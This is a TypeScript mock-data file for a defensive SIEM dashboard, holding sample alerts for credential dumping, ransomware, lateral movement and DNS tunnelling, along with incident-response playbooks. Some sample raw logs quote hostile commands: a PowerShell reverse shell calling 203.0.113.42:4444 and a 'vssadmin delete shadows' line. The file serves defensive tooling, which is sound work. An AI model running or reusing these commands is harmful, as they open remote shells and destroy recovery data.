// ===== THREATLENS AI — DEFENSIVE & SIEM MOCK DATA =====

export type AlertSeverity = "critical" | "high" | "medium" | "low" | "info";
export type AlertStatus = "active" | "investigating" | "contained" | "resolved" | "false-positive";
export type NistFunction = "identify" | "protect" | "detect" | "respond" | "recover";

// ----- SIEM Alert Detail -----
export interface SiemAlert {
  id: string;
  severity: AlertSeverity;
  title: string;
  description: string;
  source: string;
  sourceIp: string;
  destIp: string;
  timestamp: string;
  mitreTactic: string;
  mitreId: string;
  status: AlertStatus;
  assignee?: string;
  count: number;
  rawLog: string;
  relatedOscSim?: string;
}

export const siemAlerts: SiemAlert[] = [
  {
    id: "SIEM-2401",
    severity: "critical",
    title: "Credential Dumping via LSASS Memory Access",
    description: "Process 'svchost_update.exe' (PID 4892) accessed LSASS memory on endpoint DC-01. This matches behavior consistent with Mimikatz credential harvesting. The process was spawned from an encoded PowerShell command.",
    source: "Endpoint Detection & Response",
    sourceIp: "10.0.1.15",
    destIp: "10.0.1.15",
    timestamp: "2026-04-23T09:32:14Z",
    mitreTactic: "Credential Access",
    mitreId: "T1003.001",
    status: "active",
    assignee: "SOC-Team-Alpha",
    count: 1,
    rawLog: '[2026-04-23T09:32:14.892Z] ALERT: Process "svchost_update.exe" (PID:4892, PPID:3201) accessed lsass.exe memory. Calling API: NtReadVirtualMemory. Hash: a3f2b7c9d1e4f5... (known Mimikatz variant)',
    relatedOscSim: "SIM-2026-04-22-003",
  },
  {
    id: "SIEM-2402",
    severity: "critical",
    title: "Ransomware File Encryption Activity",
    description: "Rapid sequential file modifications detected across multiple directories on FILE-SRV-02. 847 files renamed with '.locked' extension in 45 seconds. Volume Shadow Copy deletion attempted.",
    source: "File Integrity Monitor",
    sourceIp: "10.0.2.88",
    destIp: "10.0.2.88",
    timestamp: "2026-04-23T09:28:47Z",
    mitreTactic: "Impact",
    mitreId: "T1486",
    status: "investigating",
    count: 847,
    rawLog: '[2026-04-23T09:28:47.112Z] FIM: 847 files modified in /data/shared/ within 45s. Pattern: *.docx -> *.docx.locked. VSS deletion attempted via "vssadmin delete shadows /all /quiet"',
  },
  {
    id: "SIEM-2403",
    severity: "high",
    title: "Lateral Movement via SMB: PsExec Detected",
    description: "PsExec-style remote execution detected from WKS-042 targeting multiple hosts on subnet 10.0.2.x. Service created: 'PSEXESVC'. Authentication using compromised domain credentials.",
    source: "Network IDS",
    sourceIp: "10.0.1.42",
    destIp: "10.0.2.0/24",
    timestamp: "2026-04-23T09:25:03Z",
    mitreTactic: "Lateral Movement",
    mitreId: "T1021.002",
    status: "contained",
    assignee: "SOC-Team-Beta",
    count: 12,
    rawLog: '[2026-04-23T09:25:03.445Z] NIDS: SMB traffic from 10.0.1.42 -> 10.0.2.[11,15,22,34,41,55]. Service "PSEXESVC" created on targets. Auth: DOMAIN\\svc_backup (compromised)',
    relatedOscSim: "SIM-2026-04-22-001",
  },
  {
    id: "SIEM-2404",
    severity: "high",
    title: "Suspicious PowerShell with Network Callback",
    description: "Encoded PowerShell command decoded to reverse shell payload targeting external IP 203.0.113.42:4444. Base64 encoded IEX with Net.Sockets.TCPClient.",
    source: "EDR Agent",
    sourceIp: "10.0.3.42",
    destIp: "203.0.113.42",
    timestamp: "2026-04-23T09:18:22Z",
    mitreTactic: "Execution",
    mitreId: "T1059.001",
    status: "active",
    count: 1,
    rawLog: '[2026-04-23T09:18:22.789Z] EDR: PowerShell.exe -enc SQBFAFgAKABOAGUAdw... decoded to: IEX(New-Object Net.Sockets.TCPClient("203.0.113.42",4444)).GetStream()',
  },
  {
    id: "SIEM-2405",
    severity: "medium",
    title: "Brute Force Authentication Attempts on SSH",
    description: "347 failed SSH login attempts from external IP 198.51.100.77 targeting DMZ server within a 10-minute window. Multiple usernames tested: root, admin, ubuntu, deploy.",
    source: "Auth Monitor",
    sourceIp: "198.51.100.77",
    destIp: "10.0.5.10",
    timestamp: "2026-04-23T09:12:55Z",
    mitreTactic: "Credential Access",
    mitreId: "T1110.001",
    status: "resolved",
    count: 347,
    rawLog: '[2026-04-23T09:12:55.001Z] AUTH: 347 failed SSH attempts from 198.51.100.77 in 600s. Usernames: root(124), admin(89), ubuntu(67), deploy(42), test(25). IP blocked by fail2ban.',
  },
  {
    id: "SIEM-2406",
    severity: "medium",
    title: "DNS Tunneling Detected: High-Volume TXT Queries",
    description: "Anomalous DNS query volume: 2,847 TXT record queries to single domain (data.evil-c2.xyz) in 5 minutes from workstation 10.0.1.88. Payload encoding detected in query names.",
    source: "DNS Analytics",
    sourceIp: "10.0.1.88",
    destIp: "8.8.8.8",
    timestamp: "2026-04-23T09:05:33Z",
    mitreTactic: "Exfiltration",
    mitreId: "T1048.001",
    status: "investigating",
    count: 2847,
    rawLog: '[2026-04-23T09:05:33.221Z] DNS: 2847 TXT queries from 10.0.1.88 -> data.evil-c2.xyz in 300s. Avg query length: 189 chars. Encoding: Base32. Est. data exfil: ~2.1MB',
  },
  {
    id: "SIEM-2407",
    severity: "low",
    title: "Port Scan: Sequential TCP SYN Sweep",
    description: "Sequential TCP SYN scan detected from external IP across ports 1-1024 targeting perimeter firewall. Scan rate: ~200 ports/second. No exploitation attempts followed.",
    source: "Firewall",
    sourceIp: "198.51.100.77",
    destIp: "10.0.0.1",
    timestamp: "2026-04-23T08:55:12Z",
    mitreTactic: "Reconnaissance",
    mitreId: "T1046",
    status: "resolved",
    count: 1024,
    rawLog: '[2026-04-23T08:55:12.445Z] FW: TCP SYN scan from 198.51.100.77 -> 10.0.0.1 ports 1-1024. Rate: 200/s. Duration: 5.1s. All packets dropped. No RST replies sent.',
  },
  {
    id: "SIEM-2408",
    severity: "info",
    title: "Scheduled Vulnerability Scan Completed",
    description: "Weekly automated vulnerability scan of DMZ segment completed. 12 new findings identified (0 critical, 2 high, 4 medium, 6 low). Results sent to patch management queue.",
    source: "Vulnerability Scanner",
    sourceIp: "10.0.10.5",
    destIp: "10.0.5.0/24",
    timestamp: "2026-04-23T08:30:00Z",
    mitreTactic: "N/A",
    mitreId: "N/A",
    status: "resolved",
    count: 12,
    rawLog: '[2026-04-23T08:30:00.000Z] VSCAN: Weekly DMZ scan complete. Targets: 24 hosts. Duration: 45m. Findings: 12 (C:0 H:2 M:4 L:6). Report: /scans/weekly/2026-04-23.pdf',
  },
];

// ----- Remediation Playbooks -----
export interface RemediationStep {
  step: number;
  action: string;
  detail: string;
  automated: boolean;
  status: "complete" | "in-progress" | "pending";
  nistFunction: NistFunction;
}

export interface RemediationPlaybook {
  id: string;
  alertId: string;
  title: string;
  severity: AlertSeverity;
  rootCause: string;
  impact: string;
  affectedAssets: string[];
  steps: RemediationStep[];
  estimatedTime: string;
  nistAlignment: string;
}

export const remediationPlaybooks: Record<string, RemediationPlaybook> = {
  "SIEM-2401": {
    id: "PB-001",
    alertId: "SIEM-2401",
    title: "Credential Dumping Response Playbook",
    severity: "critical",
    rootCause: "Malicious process (Mimikatz variant) accessed LSASS memory to extract plaintext credentials. Initial access likely via phishing email with macro-enabled document delivered to user jsmith@corp.local.",
    impact: "Domain admin credentials potentially compromised. All services authenticated via AD are at risk of unauthorized access.",
    affectedAssets: ["DC-01 (Domain Controller)", "jsmith workstation (WKS-042)", "Active Directory service"],
    steps: [
      { step: 1, action: "Isolate affected endpoint", detail: "Network-isolate DC-01 and WKS-042 from the domain via EDR containment action. Maintain forensic connectivity.", automated: true, status: "complete", nistFunction: "respond" },
      { step: 2, action: "Kill malicious process", detail: "Terminate svchost_update.exe (PID 4892) and parent PowerShell process (PID 3201). Quarantine binaries.", automated: true, status: "complete", nistFunction: "respond" },
      { step: 3, action: "Rotate compromised credentials", detail: "Force password reset for all accounts authenticated during the exposure window (09:00-09:32 UTC). Priority: Domain Admins, Service Accounts.", automated: false, status: "in-progress", nistFunction: "respond" },
      { step: 4, action: "Scan for lateral movement", detail: "Run IOC sweep across all domain-joined endpoints for svchost_update.exe hash and related PowerShell commands.", automated: true, status: "in-progress", nistFunction: "detect" },
      { step: 5, action: "Enable additional monitoring", detail: "Deploy enhanced LSASS protection (PPL), enable Credential Guard, increase auth log verbosity for 72 hours.", automated: false, status: "pending", nistFunction: "protect" },
      { step: 6, action: "Conduct forensic analysis", detail: "Capture memory dump from DC-01 before remediation. Analyze Mimikatz output to determine which credentials were extracted.", automated: false, status: "pending", nistFunction: "identify" },
      { step: 7, action: "Update detection rules", detail: "Add YARA rule for identified Mimikatz variant hash. Update EDR policy to alert on LSASS access patterns.", automated: true, status: "pending", nistFunction: "detect" },
      { step: 8, action: "Post-incident review", detail: "Document timeline, root cause, and response actions. Update incident response playbook. Schedule tabletop exercise.", automated: false, status: "pending", nistFunction: "recover" },
    ],
    estimatedTime: "2-4 hours",
    nistAlignment: "NIST CSF 2.0 — RS.AN (Analysis), RS.MI (Mitigation), RC.RP (Recovery Planning)",
  },
  "SIEM-2402": {
    id: "PB-002",
    alertId: "SIEM-2402",
    title: "Ransomware Containment & Recovery Playbook",
    severity: "critical",
    rootCause: "Ransomware binary deployed via PsExec lateral movement from compromised workstation. Encryption targets file shares on FILE-SRV-02. Volume Shadow Copies targeted for deletion.",
    impact: "847 files encrypted on shared drive. Business-critical documents in /data/shared/ temporarily inaccessible. VSS deletion would prevent local recovery.",
    affectedAssets: ["FILE-SRV-02", "Shared drive /data/shared/", "Volume Shadow Copy Service"],
    steps: [
      { step: 1, action: "Network isolation", detail: "Immediately disconnect FILE-SRV-02 from network to prevent further encryption spread. Block SMB (445) at segment firewall.", automated: true, status: "complete", nistFunction: "respond" },
      { step: 2, action: "Preserve VSS snapshots", detail: "Prevent VSS deletion by killing ransomware process. Verify shadow copy availability with 'vssadmin list shadows'.", automated: true, status: "complete", nistFunction: "respond" },
      { step: 3, action: "Identify ransomware variant", detail: "Submit ransomware binary to sandbox. Check file magic bytes and ransom note against known families.", automated: true, status: "in-progress", nistFunction: "identify" },
      { step: 4, action: "Restore from backup", detail: "Initiate file restoration from last known good backup (2026-04-23 02:00 UTC daily backup). Validate integrity.", automated: false, status: "pending", nistFunction: "recover" },
      { step: 5, action: "Scan all endpoints", detail: "Deploy IOC scan across all file servers and workstations for ransomware variant indicators.", automated: true, status: "pending", nistFunction: "detect" },
      { step: 6, action: "Patch entry vector", detail: "Identify and remediate the initial access vector. Update AV signatures and EDR detection rules.", automated: false, status: "pending", nistFunction: "protect" },
    ],
    estimatedTime: "4-8 hours",
    nistAlignment: "NIST CSF 2.0 — RS.MI (Mitigation), RC.RP (Recovery Planning), RC.CO (Communications)",
  },
  "SIEM-2403": {
    id: "PB-003",
    alertId: "SIEM-2403",
    title: "Lateral Movement Containment Playbook",
    severity: "high",
    rootCause: "Compromised service account (svc_backup) used for PsExec-based lateral movement. Account password was in a credential dump from a prior incident.",
    impact: "12 systems on subnet 10.0.2.x had PSEXESVC service installed. Potential for data access and further privilege escalation.",
    affectedAssets: ["WKS-042 (source)", "12 hosts on 10.0.2.x subnet", "svc_backup service account"],
    steps: [
      { step: 1, action: "Disable compromised account", detail: "Immediately disable svc_backup in Active Directory. Revoke all active Kerberos tickets (krbtgt double-reset if needed).", automated: true, status: "complete", nistFunction: "respond" },
      { step: 2, action: "Remove PSEXESVC", detail: "Remove PSEXESVC service from all 12 affected hosts. Delete associated binaries.", automated: true, status: "complete", nistFunction: "respond" },
      { step: 3, action: "Audit affected systems", detail: "Check each compromised host for persistence mechanisms, scheduled tasks, and new user accounts.", automated: true, status: "in-progress", nistFunction: "detect" },
      { step: 4, action: "Segment network", detail: "Apply micro-segmentation rules to restrict lateral SMB traffic between workstation and server subnets.", automated: false, status: "pending", nistFunction: "protect" },
    ],
    estimatedTime: "1-2 hours",
    nistAlignment: "NIST CSF 2.0 — RS.AN (Analysis), RS.MI (Mitigation), PR.AC (Access Control)",
  },
};

// ----- SIEM Telemetry Stats -----
export interface SiemStats {
  eventsPerSecond: number;
  activeAlerts: number;
  meanResponseTime: string;
  alertsLast24h: number;
  falsePositiveRate: number;
  automatedResponses: number;
}

export const siemStats: SiemStats = {
  eventsPerSecond: 12847,
  activeAlerts: 4,
  meanResponseTime: "3m 42s",
  alertsLast24h: 23,
  falsePositiveRate: 4.2,
  automatedResponses: 7,
};

// ----- Alert Severity Distribution -----
export const severityDistribution = [
  { name: "Critical", value: 2, color: "#ef4444" },
  { name: "High", value: 3, color: "#f59e0b" },
  { name: "Medium", value: 5, color: "#3b82f6" },
  { name: "Low", value: 8, color: "#10b981" },
  { name: "Info", value: 5, color: "#94a3b8" },
];
